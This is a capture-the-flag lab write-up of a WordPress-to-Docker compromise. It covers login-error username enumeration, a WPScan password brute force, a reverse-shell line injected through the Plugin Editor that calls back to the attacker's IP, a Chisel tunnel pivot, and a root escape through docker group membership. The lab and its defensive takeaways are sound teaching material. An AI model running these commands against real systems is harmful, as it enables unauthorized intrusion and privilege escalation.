For Business Reasons: WordPress to Docker escape via lxd

A default-credential WordPress login, a plugin editor turned reverse shell, a network full of nested Docker containers reached only through a manually built tunnel, and a root escape through a single group membership nobody thought to audit.

Room: For Business Reasons Category: Web / Pivoting / Linux Privesc Tools: WPScan, linPEAS, Chisel

The setup: a WordPress site on port 80, nothing else visible from outside. The job: get a foothold, then discover and reach a hidden internal Docker network to find root.

No single flag in these notes, the target is a root shell inside the internal network.

The Investigation

1
Find a username, then confirm it the slow way

A WordPress "Test post" byline, "By sysadmin," hands over a candidate username before any scanning tool runs. Typing it into the login form with a wrong password confirms it's real, WordPress's own error message gives it away:

Error: The password you entered for the username sysadmin is incorrect.
Lost your password?

(A nonexistent username instead returns "Unknown username. Check again or try your email address," a different message entirely.)

Why this works

WordPress's default login form leaks exactly the thing an attacker wants to know, whether a username exists, through two different error strings. That distinction is what every later brute-force attempt needs to actually target a real account.

2
Confirm XML-RPC, then brute-force the password
wpscan --url 10.10.148.62

[+] XML-RPC seems to be enabled: http://10.10.148.62/xmlrpc.php
    Found By: Direct Access (Aggressive Detection)
    Confidence: 100%

XML-RPC being enabled means WordPress's system.multicall endpoint can test many credential pairs in a single HTTP request, dramatically speeding up a brute force:

wpscan --url 10.10.77.148/ -U sysadmin -P /usr/share/wordlists/rockyou.txt

[!] Valid Combinations Found:
 | Username: sysadmin, Password: milkshake
Why this works

XML-RPC's bulk request feature exists for legitimate blogging clients, but it also happens to let a brute-forcer skip WordPress's normal per-request overhead, which is exactly why WPScan checks for it first and calls it out as a finding on its own.

3
Turn the Plugin Editor into a shell

Logged in as sysadmin, the built-in Plugin Editor lets any installed plugin's PHP be edited directly. Appending one line to the inactive "Hello Dolly" plugin's hello.php:

exec('/bin/bash -c "bash -i >& /dev/tcp/10.2.57.21/4444 0>&1"');

Clicking Activate on the edited plugin runs that line immediately, with a listener already waiting:

nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.2.57.21] from (UNKNOWN) [10.10.140.47] 45810
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@3ffad52fb534:/var/www/html/wp-admin$ whoami
www-data
Why this works

The Plugin Editor is, by design, a text editor for PHP files the server will execute on the next page load or activation. Any account with plugin-edit rights has code execution, no separate vulnerability required.

4
Find the hidden internal network

Running linPEAS (pulled over directly with curl from the attack box) surfaces something odd in its network section, interfaces on subnets that have nothing to do with the public-facing host:

www-data@3ffad52fb534:/tmp$ curl http://10.2.57.21:8000/linpeasv3_2.sh -O linpeas.sh

[+] Networks and neighbours
Iface  Destination  Gateway    Flags  Mask

The 02:42:... MAC prefix is Docker's own default, this box is itself a container, sitting on at least two separate Docker networks. Pulling a static nmap binary over the same way and scanning both ranges confirms multiple live hosts:

www-data@3ffad52fb534:/tmp$ ./nmap -sn 172.18.0.1/24 10.0.0.5/24

Nmap scan report for 172.18.0.1

Nmap scan report for 172.18.0.3

A static nc binary, checked against the usual ports one host at a time, finds SSH open on the gateway address:

www-data@3ffad52fb534:/tmp$ ./'nc(1)' -zv 172.18.0.1 22
172.18.0.1 22 open
Why this works

A compromised host is a vantage point, not just an endpoint. linPEAS flagging unfamiliar network interfaces is exactly how a Docker-internal network that's completely invisible from outside the box gets discovered in the first place.

5
Build a reverse tunnel to reach it

Nothing on the attack box can route to 172.18.0.1 directly, so Chisel builds a tunnel through the compromised host instead. The server listens on the attack box, the client runs on the target and forwards a local port back through to the internal SSH service:

# attack box
sudo chisel server -p 8001 --reverse -v

# target (www-data shell)
./chisel64 client 10.2.57.21:8001 R:127.0.0.1:8005:172.18.0.1:22

The first attempt fails because the server and the forwarded local port were set to the same number:

2021/06/27 11:58:53 server: session#1: Failed: server: Server cannot listen on R:127.0.0.1:8001=>172.18.0.1:22

Moving the forward to a different local port (8005) fixes it:

2021/06/27 12:05:24 server: session#2: tun: proxy#R:127.0.0.1:8005=>172.18.0.1:22: Listening
2021/06/27 12:05:24 server: session#2: tun: SSH connected
Why this works

Chisel's reverse mode makes the target dial out to the attack box, which sidesteps any inbound firewall on the target entirely. The server and the port being forwarded to the internal target have to be two distinct local ports, reusing one for both breaks the tunnel silently until the log line spells out why.

6
SSH through the tunnel into the internal container
ssh sysadmin@127.0.0.1 -p8005
The authenticity of host '[127.0.0.1]:8005 ([127.0.0.1]:8005)' can't be established.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
sysadmin@127.0.0.1's password:
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
sysadmin@ubuntu:~$

The same sysadmin credentials from the WordPress brute force work again here. Checking group membership turns up something worth a second look:

sysadmin@ubuntu:/tmp$ id
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),122(docker)
Why this works

Credential reuse across completely different systems is common enough to always be worth trying first. The lxd and docker group memberships here are the real prize, both are well-known, direct paths to root on Linux.

7
Escalate to root by mounting the host filesystem

Membership in the docker group is root-equivalent: it allows starting a container with the host's entire filesystem bind-mounted inside it.

sysadmin@ubuntu:/tmp$ docker run -v /:/mnt --rm -it mysql:5.7 sh
# whoami
root
# hostname
fa2d9c09f514
# id
uid=0(root) gid=0(root) groups=0(root)
Why this works

The Docker daemon itself runs as root, and anyone in the docker group can talk to it. Mounting / from the host into a throwaway container, then opening a shell inside that container, is root on the host, no exploit involved, just using the access the group membership already grants.

Full Attack Chain

WordPress "by sysadmin" byline → username confirmed via login error text
  → WPScan + XML-RPC: sysadmin:milkshake cracked
       → Plugin Editor: reverse shell as www-data
            → linPEAS: unfamiliar Docker-style network interfaces found
                 → nmap/nc (static binaries): internal hosts + SSH on 172.18.0.1
                      → Chisel reverse tunnel: 127.0.0.1:8005 → 172.18.0.1:22
                           → SSH as sysadmin (credential reuse)
                                → id: docker group membership
                                     → docker run -v /:/mnt: root

Takeaways

Login error messages are a username oracle

WordPress's default "unknown username" vs "incorrect password" distinction confirmed a valid account before a single scanning tool ran.

An admin panel's code editor is remote code execution

Any feature that lets an authenticated user edit server-side code the application will execute is a shell waiting to happen, Plugin Editor included.

docker/lxd group membership is root, full stop

Both grant the ability to mount the host filesystem into a container. Auditing who's in those groups matters as much as auditing sudoers.
